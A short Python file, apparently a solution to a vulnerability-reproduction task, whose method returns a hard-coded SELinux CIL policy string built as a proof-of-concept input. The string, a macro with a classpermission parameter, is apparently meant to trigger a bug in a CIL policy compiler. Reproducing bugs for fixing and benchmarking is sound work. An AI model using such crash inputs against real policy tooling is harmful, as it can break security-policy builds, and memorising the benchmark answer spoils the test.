class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = "(class file (read))(macro test ((classperm cp))(classpermissionset myset cp))(test ((classpermspec file (read))))"
        return poc.encode()